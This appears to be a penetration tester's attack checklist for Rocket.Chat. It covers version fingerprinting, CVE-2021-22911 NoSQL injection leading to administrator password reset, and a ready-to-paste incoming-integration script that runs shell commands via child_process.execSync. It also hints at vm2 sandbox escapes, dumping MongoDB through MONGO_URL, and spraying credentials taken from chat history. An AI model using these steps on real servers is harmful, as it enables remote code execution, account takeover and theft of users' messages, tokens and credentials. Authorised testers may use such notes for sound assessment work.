# Rocket.Chat

## Before I start
- [ ] Port 3000 by default
curl -sk <Scheme>://<WebHost>/api/info | jq .version
- [ ] Registration open: an account reads the channels, and the credentials, host names and runbooks in their history

## CVE-2021-22911, with no login
- [ ] Versions around 3.12 and 3.13: NoSQL injection in the password reset leaks the reset token one character at a time, through a $regex oracle: :Pb nosqli
searchsploit rocket.chat
- [ ] The public exploits run that loop, and end with the administrator's password reset

## Administrator to commands, through an integration
- [ ] Administration, Integrations, New, Incoming, with this as the script:
class Script { process_incoming_request({ request }) { return { content: { text: require('child_process').execSync('id').toString() } }; } }
THE-WEBHOOK-URL is the address the integration shows once saved:
curl -sk -X POST 'THE-WEBHOOK-URL'
- [ ] require blocked on a hardened build: the old vm2 escapes, through this.constructor.constructor
- [ ] The version, then searchsploit: :Pb web-cves

## After a shell
- [ ] MONGO_URL in the service's environment opens the whole workspace database: :Pb mongodb
- [ ] Users, messages, uploads and OAuth tokens are all in MongoDB
- [ ] A shell as the rocketchat user: :Pb linux-enum

## If it fails
- [ ] Patched, and registration closed: a source of credentials later, not a way in

## Next
- [ ] What the chat history gave: :Pb spraying
- [ ] With MongoDB: the users collection changed, and more credentials
